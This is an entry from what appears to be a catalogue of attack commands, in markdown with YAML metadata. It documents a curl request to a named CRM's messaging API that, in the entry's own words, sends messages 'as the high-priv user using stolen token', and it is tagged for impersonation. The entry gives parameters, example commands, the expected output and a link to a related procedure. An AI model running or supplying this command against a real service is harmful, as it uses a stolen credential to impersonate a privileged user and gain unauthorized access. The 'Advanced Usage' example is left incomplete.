---
data: >-
  curl -X POST "https://www.kitcrm.com/api/v2/messages" -H "Authorization:
  Bearer TOKEN" -H "Content-Type: application/json" -d '{"incoming_message":
  "MESSAGE"}'
tags:
  - send
  - impersonate
type: command
executor: bash
platforms:
  - Web
id: 5a489006-3f8a-4da0-9e49-b9439093b9f7
created_at: '2025-12-14T17:29:57.233Z'
updated_at: '2025-12-14T17:29:57.233Z'
verified: false
validated: true
submitted: true
---
# post-kitcrm-send-message

## Command

```bash
curl -X POST "https://www.kitcrm.com/api/v2/messages" \
  -H "Authorization: Bearer HIGH_PRIV_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"incoming_message": "testtesthai"}'
```

## Description

Sends a new message to KIT as the high-priv user using stolen token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| TOKEN | Bearer token | Yes |
| incoming_message | Message text | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://www.kitcrm.com/api/v2/messages" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"incoming_message": "test"}'
```

### Advanced Usage

With full headers:

```bash
curl -H "Accept-Language: en-us" -H "User-Agent: ..." ...
```

## Expected Output

JSON success: {"status": "sent"}. Message executed.

## Related

- [[Related Procedure: Send-Messages-as-High-Priv-User]]
